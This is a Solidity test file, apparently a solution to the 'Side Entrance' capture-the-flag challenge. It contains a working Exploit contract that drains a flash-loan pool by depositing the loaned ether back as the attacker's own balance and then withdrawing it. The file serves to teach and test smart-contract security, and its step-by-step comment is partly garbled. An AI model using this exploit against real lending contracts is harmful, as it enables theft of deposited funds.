// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        Exploit exploit = new Exploit(address(sideEntranceLenderPool));
        exploit.attack();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}



/* @dev: to explot, we will:
    1. initiate flashLoan for the total amount of the pool
    2. using our own execute function, use the borrowed amount to deposit the balance of the borrowed amount from the flash loan
    3. since we deposited the balance of the flash loan, our balance before is no
    3. withdraw the balance from the pool to the contract
    4. withdraw the balance from the contract to the attacker
*/
contract Exploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool private pool;
    address payable private owner;
    uint256 private amount;

    constructor(address _pool) {
        owner = payable(msg.sender);
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: amount}();
    }

    receive() external payable {owner.transfer(amount);}
}